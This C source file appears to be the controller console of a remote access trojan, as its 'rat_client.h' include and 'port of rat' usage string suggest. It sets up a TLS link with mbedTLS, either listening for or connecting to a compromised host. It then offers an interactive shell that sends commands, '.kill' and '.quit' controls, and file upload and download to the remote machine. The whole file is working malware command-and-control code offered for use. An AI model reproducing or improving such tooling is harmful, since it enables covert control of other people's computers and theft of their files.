#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <signal.h>
#include <fcntl.h>
#include <poll.h>

#include "mbedtls/net.h"
#include "mbedtls/debug.h"
#include "mbedtls/ssl.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/error.h"
#include "mbedtls/certs.h"
#include "mbedtls/sha256.h"

#include "readline/readline.h"
#include "readline/history.h"

#include "rat_client.h"

#include "../keys/local_ssl_certificate.h"
#include "../keys/local_ssl_keypair.h"

#define BUFFER_SIZE 16384

jmp_buf resume_point, reconnect_point;

void interrupt_handler(int value)
{
    longjmp(resume_point, 1);
}

int main(int argc, char *argv[])
{
    setjmp(reconnect_point);

    char *ip_addr_string = NULL, *port = NULL;
    char default_ip[] = "0.0.0.0";
    int ret = 0;
    uint32_t flags;
    unsigned char *file_buffer = NULL;
    char *new_buffer = NULL;
    struct pollfd fds[256];
    struct compression compress;
    int nfds = 1;
    unsigned char client_ip[19] = { 0 };
    size_t cliip_len = 0;

    //mbedTLS variables
    mbedtls_net_context sockfd;
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    mbedtls_ssl_context ssl;
    mbedtls_ssl_config conf;
    mbedtls_x509_crt srvcert;
    mbedtls_pk_context pkey;

    mbedtls_net_init( &sockfd );
    mbedtls_ssl_init( &ssl );
    mbedtls_ssl_config_init( &conf );
    mbedtls_x509_crt_init( &srvcert );
    mbedtls_pk_init( &pkey );
    mbedtls_ctr_drbg_init( &ctr_drbg );
    mbedtls_entropy_init( &entropy );

    if (argc == 2) {
        ip_addr_string = default_ip;
        port = argv[1];
    } else if (argc == 3){
        port = argv[2];
        ip_addr_string = argv[1];
    } else {
        printf("\n Usage: %s <ip of server> <port of rat> \n", argv[0]);
        return 1;
    }

    printf( "\n  . Seeding the random number generator..." );
    fflush( stdout );
    mbedtls_entropy_init( &entropy );
    if ( ( ret = mbedtls_ctr_drbg_seed( &ctr_drbg, mbedtls_entropy_func, &entropy, NULL, 256 ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ctr_drbg_seed returned %d\n", ret );
        return 2;
    }
    printf(" ok\n");

    printf( "  . Loading the CA root certificate ..." );
    fflush( stdout );
    //ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt, mbedtls_test_srv_crt_len );
    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) ssl_certificate_pem, ssl_certificate_pem_len + 1);
    if( ret != 0 ) {
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        return 3;
    }

    //ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_cas_pem, mbedtls_test_cas_pem_len );
    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) ssl_certificate_pem, ssl_certificate_pem_len + 1);
    if ( ret < 0 ) {
        printf( " failed\n  !  mbedtls_x509_crt_parse returned -0x%x\n\n", -ret );
        return 3;
    }

    //ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key, mbedtls_test_srv_key_len, NULL, 0 );
    ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) ssl_keypair_key, ssl_keypair_key_len + 1, NULL, 0 );
    if( ret != 0 ) {
        printf( " failed\n  !  mbedtls_pk_parse_key returned %d\n\n", ret );
        return 3;
    }
    printf( " ok\n" );

    if (strncmp(ip_addr_string, "0.0.0.0", 9) == 0){
        printf("Listening on tcp %s:%s...\n", ip_addr_string, port);
        if ( ( ret = mbedtls_net_bind( &sockfd, NULL, port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_bind returned %d\n\n", ret );
            return 4;
        }
        
        if ( ( ret = mbedtls_net_accept( &sockfd, &sockfd, client_ip, sizeof(client_ip), &cliip_len ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_accept returned %d\n\n", ret );
            return 9;
        }
        #ifdef DEBUG
        struct sockaddr_in addr;
        socklen_t addr_len = sizeof(addr);
        int err = getpeername(sockfd.fd, (struct sockaddr *) &addr, &addr_len);
        if (err == 0)
            printf("[*]: New connection from %s:%d on socket %d\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port), sockfd.fd);
        else
            printf("[*]: New connection on socket %d\n", sockfd.fd);
        #endif
        //printf("Client: %s\n", client_ip);

        printf("Server Mode\n");
        if ( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            return 5;
        }

    } else {
        printf("Connecting to tcp %s/%s...\n", ip_addr_string, port);
        if ( ( ret = mbedtls_net_connect( &sockfd, ip_addr_string, port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_connect returned %d\n\n", ret );
            return 4;
        }

        if ( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_CLIENT, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            return 5;
        }
        mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_OPTIONAL );
    }

    mbedtls_ssl_conf_read_timeout( &conf, 500);

    printf( "  . Setting up the SSL/TLS structure..." );
    fflush( stdout );
    mbedtls_ssl_conf_rng( &conf, mbedtls_ctr_drbg_random, &ctr_drbg );
    mbedtls_ssl_conf_ca_chain( &conf, srvcert.next, NULL );
    if( ( ret = mbedtls_ssl_conf_own_cert( &conf, &srvcert, &pkey ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ssl_conf_own_cert returned %d\n\n", ret );
        return 6;
    }
    
    if ( ( ret = mbedtls_ssl_setup( &ssl, &conf ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
        return 6;
    }
    printf( " ok\n" );

    mbedtls_ssl_set_bio( &ssl, &sockfd, mbedtls_net_send, NULL, mbedtls_net_recv_timeout );

    printf( "  . Performing the SSL/TLS handshake..." );
    fflush( stdout );
    while ( ( ret = mbedtls_ssl_handshake( &ssl ) ) != 0 ) {
        if ( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
            printf( " failed\n  ! mbedtls_ssl_handshake returned -0x%x\n\n", -ret );
            return 8;
        }
    }
    printf( " ok\n" );

    printf( "  . Verifying peer X.509 certificate..." );
    /* In real life, we probably want to bail out when ret != 0 */
    if( ( flags = mbedtls_ssl_get_verify_result( &ssl ) ) != 0 && flags != MBEDTLS_X509_KU_DIGITAL_SIGNATURE) {
        char vrfy_buf[512];

        printf( " failed\n");
        mbedtls_x509_crt_verify_info( vrfy_buf, sizeof( vrfy_buf ), "  ! ", flags );
        printf( "%s\n", vrfy_buf );
        return -10;
    } else {
        printf( " ok\n" );
    }

    printf("Cipher: %s\n", mbedtls_ssl_get_ciphersuite( &ssl ));

    /*************************************************************/
    /* Set up the initial listening socket                        */
    /*************************************************************/
    memset(fds, -1, sizeof(fds));
    fds[0].fd = sockfd.fd;
    fds[0].events = POLLIN;
    fds[0].revents = 0;

    memset(&compress, 0, sizeof(struct compression));
    if ((compress.orig_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.orig_buffer, 0, BUFFER_SIZE);

    if ((compress.transformed_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);

    using_history();
    if ( mbedtls_ssl_read(&ssl, client_ip, sizeof(client_ip)) == -1){
        printf("Error getting remote IP address\n");
        strncpy((char*)client_ip, "0.0.0.0", 8);
    }
    ip_addr_string = strncat((char*)client_ip, "> ", 3);

    signal(SIGINT, interrupt_handler);
    signal(SIGTSTP, interrupt_handler);
    setjmp(resume_point);

    printf("\n");

    // print banner from server
    memset(compress.orig_buffer, 0, BUFFER_SIZE);
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);
    compress.orig_size = mbedtls_ssl_read(&ssl, compress.orig_buffer, BUFFER_SIZE);

    //Got an error or connection closed by client
    if (compress.orig_size == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
        //Connection closed
        printf("%s: socket %d hung up\n", ip_addr_string, sockfd.fd);
        goto Cleanup;
    }

    //TODO Check return value
    decompress_buffer(&compress);
    printf("%s", compress.transformed_buffer);
    memset(compress.orig_buffer, 0, BUFFER_SIZE);
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);
    fflush(stdout);

    while(1) {
        memset(compress.orig_buffer, 0, BUFFER_SIZE);
        memset(compress.transformed_buffer, 0, BUFFER_SIZE);

        printf("\n");
        new_buffer = readline(ip_addr_string);
        add_history(new_buffer);
        strncpy((char*)compress.orig_buffer, new_buffer, BUFFER_SIZE);
        free(new_buffer);
        compress.orig_size = strnlen((char*)compress.orig_buffer, BUFFER_SIZE);
        compress_buffer(&compress);

        if ( mbedtls_ssl_write( &ssl, compress.transformed_buffer, compress.transformed_size) == -1 ) {
            perror("Error sending");
            goto Cleanup;
        }

        if (strncmp(".kill", (char*)compress.orig_buffer, 5) == 0) {
            printf("Finishing...\n");
            goto Cleanup;
        }

        if (strncmp(".quit", (char*)compress.orig_buffer, 5) == 0) {
            printf("Disconnecting...\n");
            goto Cleanup;
        }

        if (strncmp("upload ", (char*)compress.orig_buffer, 7) == 0) {
            upload_file(&compress, ssl);
            continue;
        }

        if (strncmp("download ", (char*)compress.orig_buffer, 9) == 0){
            download_file(&compress, ssl);
            continue;
        }

        //Recv with poll
        if (poll(fds, nfds, -1) < 0) {
            printf("Poll failed\n");
            goto Cleanup;
        }

        if (fds[0].revents & POLLIN) {
            do {
                memset(compress.orig_buffer, 0, BUFFER_SIZE);
                memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                compress.orig_size = mbedtls_ssl_read(&ssl, compress.orig_buffer, BUFFER_SIZE);

                //Got an error or connection closed by client
                if (compress.orig_size == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
                    //Connection closed
                    printf("%s: socket %d hung up\n", ip_addr_string, sockfd.fd);
                    goto Cleanup;
                }

                if (compress.orig_size <= 0) {
                    printf("Connection failed. Attempting reconnection...\n");
                    longjmp(reconnect_point, 1);
                }

                //TODO Check return value
                decompress_buffer(&compress);
                printf("%s", compress.transformed_buffer);
                fflush(stdout);
                poll(fds, nfds, 500);
                mbedtls_ssl_read(&ssl, NULL, 0);
            } while (mbedtls_ssl_get_bytes_avail(&ssl) > 0);
            //if (strnlen((char*)compress.transformed_buffer, BUFFER_SIZE) != BUFFER_SIZE) {
            //    printf("\n\nLength: %zu\n\n", strnlen((char*)compress.transformed_buffer, BUFFER_SIZE));
            //}
        }
    } //while loop

    goto Cleanup;

Cleanup:
    free(compress.orig_buffer);
    free(compress.transformed_buffer);
    free(file_buffer);
    mbedtls_net_free( &sockfd );
    mbedtls_x509_crt_free( &srvcert );
    mbedtls_ssl_free( &ssl );
    mbedtls_ssl_config_free( &conf );
    mbedtls_ctr_drbg_free( &ctr_drbg );
    mbedtls_entropy_free( &entropy );

    printf("\nExiting...\n");

    return 0;
}
